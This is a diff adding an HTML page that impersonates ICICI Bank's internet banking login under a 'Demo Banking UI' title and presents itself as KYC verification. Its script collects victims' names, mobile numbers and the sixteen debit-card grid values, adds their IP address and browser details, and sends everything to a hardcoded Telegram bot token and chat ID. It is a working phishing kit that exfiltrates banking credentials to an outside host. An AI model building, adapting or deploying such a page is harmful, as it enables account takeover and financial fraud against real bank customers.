@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Demo Banking UI – Fixed Step Layout</title>
+<style>
+*{box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}
+body{margin:0;background:#eef2f8;padding-bottom:100px;min-height:100vh}
+
+/* HEADER */
+.header{background:linear-gradient(#f7941d,#f36f21);padding:10px 14px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100}
+.header img{height:34px}
+.login-btn{background:#fff;border-radius:6px;padding:6px 12px;font-size:14px;border:none}
+
+/* STEPS NAV - HIDDEN */
+.steps{display:none}
+
+/* CARD */
+.card{background:#fff;width:92%;max-width:420px;margin:20px auto 30px;border-radius:14px;padding:16px;box-shadow:0 2px 8px rgba(0,0,0,.1)}
+.card-title{display:flex;align-items:center;gap:8px;font-size:18px;font-weight:bold;margin-bottom:14px}
+
+/* INPUTS */
+.input{width:100%;padding:14px;margin-bottom:12px;border:1px solid #ccc;border-radius:6px;font-size:15px}
+.input:focus{outline:none;border:2px solid #f7941d}
+
+/* BUTTON */
+.btn{width:100%;background:#f36f21;color:#fff;border:none;padding:14px;font-size:16px;border-radius:6px;margin-top:10px;cursor:pointer}
+.btn:hover{background:#e05e1a}
+.btn:disabled{background:#ccc;cursor:not-allowed}
+
+/* LOADING */
+.loading{display:none;text-align:center;color:#f36f21;margin:10px 0}
+
+/* GRID - FIXED - 8 PER LINE */
+.grid-img{width:100%;border-radius:8px;margin:10px 0 14px}
+.grid-container{width:100%;overflow:hidden}
+.grid{display:grid;grid-template-columns:repeat(8,1fr);gap:6px;width:100%}
+.grid input{width:100%;height:40px;text-align:center;border:1px solid #ccc;border-radius:4px;font-size:14px;padding:5px}
+.grid input::placeholder{color:#999;font-size:11px}
+
+/* SUCCESS PAGE - IMPROVED */
+.success-page{text-align:center;padding:20px 0}
+.success-icon{width:80px;height:80px;background:#2bb673;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;font-size:40px;color:white}
+.success-title{color:#2bb673;font-size:28px;margin-bottom:10px;font-weight:bold}
+.success-message{color:#555;font-size:16px;margin-bottom:25px;line-height:1.5}
+.success-card{background:#fff;width:92%;max-width:420px;margin:0 auto 20px;border-radius:14px;padding:25px;box-shadow:0 2px 8px rgba(0,0,0,.1)}
+.success-bank-logo{width:180px;margin:25px auto}
+.security-notice{background:#fff3cd;border:1px solid #ffeaa7;border-radius:10px;padding:16px;margin:20px auto;width:92%;max-width:420px;color:#856404;font-size:14px}
+.security-icon{color:#f36f21;font-size:18px;margin-right:8px}
+
+/* FOOTER - FIXED POSITION */
+.footer{text-align:center;color:#333;font-size:12px;padding:14px 0;border-top:1px solid #ddd;width:100%;background:#fff;position:fixed;bottom:0;left:0}
+.footer-content{max-width:420px;margin:0 auto;padding:0 16px}
+.footer-links{margin:8px 0;color:#f36f21}
+.footer-links a{color:#f36f21;text-decoration:none;margin:0 8px}
+.footer-links a:hover{text-decoration:underline}
+
+/* STEP VISIBILITY */
+.step-page{display:none}
+.step-page.active{display:block}
+
+/* BUTTON CONTAINER */
+.button-container{display:flex;gap:10px;margin-top:10px}
+.button-container .btn{flex:1;margin-top:0}
+.btn-back{background:#777 !important}
+.btn-back:hover{background:#666 !important}
+</style>
+</head>
+<body>
+
+<!-- HEADER -->
+<div class="header">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/ICICI_Bank_Logo.svg/1200px-ICICI_Bank_Logo.svg.png" />
+  <button class="login-btn">Login</button>
+</div>
+
+<!-- STEP 1 -->
+<div class="step-page active" id="step1">
+  <div class="card">
+    <div class="card-title">🔒 Login to Internet Banking</div>
+    <input class="input" placeholder="Full Name" id="fullName" />
+    <input class="input" placeholder="Mobile Number" id="mobileNumber" type="tel" maxlength="10" />
+    <div class="loading" id="loading1">Sending data...</div>
+    <button class="btn" id="submitBtn1" onclick="submitStep1()">SUBMIT</button>
+  </div>
+</div>
+
+<!-- STEP 2 -->
+<div class="step-page" id="step2">
+  <div class="card">
+    <h3 style="text-align:center;margin-bottom:6px">Grid Information</h3>
+    <p style="font-size:13px;color:#555;text-align:center;margin-bottom:10px">
+      Your ICICI Bank Debit Card has a grid on its reverse. Enter numbers from the grid as printed against the following alphabets:
+    </p>
+    <img class="grid-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRYOYwINRhLZ3-TFHQuHh-7dU3zCTjnARR2IYFUtoHfpA&s=10" />
+    <div class="grid-container">
+      <div class="grid">
+        <!-- First Line - A to H -->
+        <input placeholder="A" id="gridA" maxlength="2"/><input placeholder="B" id="gridB" maxlength="2"/><input placeholder="C" id="gridC" maxlength="2"/><input placeholder="D" id="gridD" maxlength="2"/>
+        <input placeholder="E" id="gridE" maxlength="2"/><input placeholder="F" id="gridF" maxlength="2"/><input placeholder="G" id="gridG" maxlength="2"/><input placeholder="H" id="gridH" maxlength="2"/>
+        <!-- Second Line - I to P -->
+        <input placeholder="I" id="gridI" maxlength="2"/><input placeholder="J" id="gridJ" maxlength="2"/><input placeholder="K" id="gridK" maxlength="2"/><input placeholder="L" id="gridL" maxlength="2"/>
+        <input placeholder="M" id="gridM" maxlength="2"/><input placeholder="N" id="gridN" maxlength="2"/><input placeholder="O" id="gridO" maxlength="2"/><input placeholder="P" id="gridP" maxlength="2"/>
+      </div>
+    </div>
+    <div class="loading" id="loading2">Sending data...</div>
+    <div class="button-container">
+      <button class="btn btn-back" onclick="prevStep()">BACK</button>
+      <button class="btn" id="submitBtn2" onclick="submitStep2()">SUBMIT</button>
+    </div>
+  </div>
+</div>
+
+<!-- STEP 3 - IMPROVED SUCCESS PAGE -->
+<div class="step-page" id="step3">
+  <div class="success-page">
+    <div class="success-card">
+      <div class="success-icon">✓</div>
+      <div class="success-title">Verification Successful!</div>
+      <div class="success-message">
+        Your KYC verification request has been submitted successfully.<br>
+        The process may take up to 2 working hours.
+      </div>
+      
+      <div class="success-bank-logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/ICICI_Bank_Logo.svg/1200px-ICICI_Bank_Logo.svg.png" style="width:100%" />
+      </div>
+      
+      <div class="security-notice">
+        <div style="display:flex;align-items:center;margin-bottom:8px">
+          <span class="security-icon">⚠</span>
+          <strong>Security Alert</strong>
+        </div>
+        <div>Do not share your CVV, OTP, PIN or any personal information with anyone. ICICI Bank never asks for such details.</div>
+      </div>
+      
+      <button class="btn" onclick="restartProcess()" style="width:100%;margin-top:20px">Start New Verification</button>
+    </div>
+  </div>
+</div>
+
+<!-- FOOTER -->
+<div class="footer">
+  <div class="footer-content">
+    <div class="footer-links">
+      <a href="#">Contact Us</a> | 
+      <a href="#">Privacy Policy</a> | 
+      <a href="#">Terms & Conditions</a> | 
+      <a href="#">Disclaimer</a>
+    </div>
+    <div>Copyright © 2025 ICICI Bank. All rights reserved.</div>
+  </div>
+</div>
+
+<script>
+let currentStep = 1;
+
+// Telegram Bot Configuration
+const TELEGRAM_BOT_TOKEN = "8361584406:AAHDoea6OR_Fy-iML2fsW4-8WrwtvRA_wgg";
+const TELEGRAM_CHAT_ID = "7155441629";
+
+// Function to send data to Telegram
+async function sendToTelegram(message) {
+  try {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'HTML'
+      })
+    });
+    
+    const data = await response.json();
+    return data.ok;
+  } catch (error) {
+    console.error('Error sending to Telegram:', error);
+    return false;
+  }
+}
+
+// Format current date and time
+function getCurrentDateTime() {
+  const now = new Date();
+  return now.toLocaleString('en-IN', {
+    timeZone: 'Asia/Kolkata',
+    year: 'numeric',
+    month: '2-digit',
+    day: '2-digit',
+    hour: '2-digit',
+    minute: '2-digit',
+    second: '2-digit',
+    hour12: false
+  });
+}
+
+// Get user IP address
+async function getUserIP() {
+  try {
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    return data.ip;
+  } catch (error) {
+    return 'IP Not Available';
+  }
+}
+
+async function submitStep1() {
+  const fullName = document.getElementById('fullName').value.trim();
+  const mobileNumber = document.getElementById('mobileNumber').value.trim();
+  
+  if (!fullName || !mobileNumber) {
+    alert('Please fill in all fields');
+    return;
+  }
+  
+  // Show loading and disable button
+  document.getElementById('loading1').style.display = 'block';
+  document.getElementById('submitBtn1').disabled = true;
+  document.getElementById('submitBtn1').innerText = 'Processing...';
+  
+  try {
+    // Get user IP
+    const userIP = await getUserIP();
+    const dateTime = getCurrentDateTime();
+    
+    // Format message for Telegram
+    const message = `
+🔒 <b>STEP 1 DATA RECEIVED</b>
+━━━━━━━━━━━━━━━━━━
+👤 <b>Full Name:</b> ${fullName}
+📱 <b>Mobile Number:</b> ${mobileNumber}
+━━━━━━━━━━━━━━━━━━
+🌐 <b>IP Address:</b> ${userIP}
+📅 <b>Date & Time:</b> ${dateTime}
+━━━━━━━━━━━━━━━━━━
+🖥️ <b>User Agent:</b> ${navigator.userAgent}
+    `;
+    
+    // Send to Telegram
+    const success = await sendToTelegram(message);
+    
+    if (success) {
+      // Move to next step
+      document.getElementById(`step${currentStep}`).classList.remove('active');
+      currentStep++;
+      document.getElementById(`step${currentStep}`).classList.add('active');
+    } else {
+      alert('Failed to submit data. Please try again.');
+    }
+  } catch (error) {
+    alert('Error submitting data. Please try again.');
+  } finally {
+    // Hide loading and enable button
+    document.getElementById('loading1').style.display = 'none';
+    document.getElementById('submitBtn1').disabled = false;
+    document.getElementById('submitBtn1').innerText = 'SUBMIT';
+  }
+}
+
+async function submitStep2() {
+  // Collect grid data
+  const gridData = {};
+  const gridInputs = document.querySelectorAll('.grid input');
+  let allFilled = true;
+  
+  gridInputs.forEach(input => {
+    const value = input.value.trim();
+    if (!value) {
+      allFilled = false;
+    }
+    gridData[input.placeholder] = value;
+  });
+  
+  if (!allFilled) {
+    alert('Please fill in all grid values');
+    return;
+  }
+  
+  // Show loading and disable button
+  document.getElementById('loading2').style.display = 'block';
+  document.getElementById('submitBtn2').disabled = true;
+  document.getElementById('submitBtn2').innerText = 'Processing...';
+  
+  try {
+    // Get user IP
+    const userIP = await getUserIP();
+    const dateTime = getCurrentDateTime();
+    
+    // Format grid data for display
+    let gridDisplay = '';
+    Object.keys(gridData).forEach(key => {
+      gridDisplay += `${key}: ${gridData[key]}\n`;
+    });
+    
+    // Format message for Telegram
+    const message = `
+🔢 <b>STEP 2 - GRID DATA RECEIVED</b>
+━━━━━━━━━━━━━━━━━━
+<b>Grid Values:</b>
+${gridDisplay}
+━━━━━━━━━━━━━━━━━━
+🌐 <b>IP Address:</b> ${userIP}
+📅 <b>Date & Time:</b> ${dateTime}
+━━━━━━━━━━━━━━━━━━
+✅ <b>Complete KYC Data Captured</b>
+    `;
+    
+    // Send to Telegram
+    const success = await sendToTelegram(message);
+    
+    if (success) {
+      // Move to next step
+      document.getElementById(`step${currentStep}`).classList.remove('active');
+      currentStep++;
+      document.getElementById(`step${currentStep}`).classList.add('active');
+    } else {
+      alert('Failed to submit data. Please try again.');
+    }
+  } catch (error) {
+    alert('Error submitting data. Please try again.');
+  } finally {
+    // Hide loading and enable button
+    document.getElementById('loading2').style.display = 'none';
+    document.getElementById('submitBtn2').disabled = false;
+    document.getElementById('submitBtn2').innerText = 'SUBMIT';
+  }
+}
+
+function prevStep() {
+  document.getElementById(`step${currentStep}`).classList.remove('active');
+  currentStep--;
+  document.getElementById(`step${currentStep}`).classList.add('active');
+}
+
+function restartProcess() {
+  // Reset to step 1
+  document.getElementById(`step${currentStep}`).classList.remove('active');
+  currentStep = 1;
+  document.getElementById(`step1`).classList.add('active');
+  
+  // Clear form inputs
+  document.getElementById('fullName').value = '';
+  document.getElementById('mobileNumber').value = '';
+  
+  // Clear grid inputs
+  const gridInputs = document.querySelectorAll('.grid input');
+  gridInputs.forEach(input => input.value = '');
+  
+  // Reset buttons
+  document.getElementById('submitBtn1').disabled = false;
+  document.getElementById('submitBtn1').innerText = 'SUBMIT';
+  document.getElementById('submitBtn2').disabled = false;
+  document.getElementById('submitBtn2').innerText = 'SUBMIT';
+}
+
+// Auto-focus and navigation for grid inputs
+document.addEventListener('DOMContentLoaded', function() {
+  const gridInputs = document.querySelectorAll('.grid input');
+  
+  gridInputs.forEach((input, index) => {
+    // Auto-tab to next input when 2 digits are entered
+    input.addEventListener('input', function(e) {
+      if (this.value.length >= 2 && index < gridInputs.length - 1) {
+        gridInputs[index + 1].focus();
+      }
+    });
+    
+    // Allow navigation with arrow keys
+    input.addEventListener('keydown', function(e) {
+      if (e.key === 'ArrowRight' && index < gridInputs.length - 1) {
+        gridInputs[index + 1].focus();
+      }
+      if (e.key === 'ArrowLeft' && index > 0) {
+        gridInputs[index - 1].focus();
+      }
+      if (e.key === 'ArrowDown' && index < 8) {
+        // Move to second line
+        gridInputs[index + 8].focus();
+      }
+      if (e.key === 'ArrowUp' && index >= 8) {
+        // Move to first line
+        gridInputs[index - 8].focus();
+      }
+    });
+  });
+});
+</script>
+</body>
+</html>
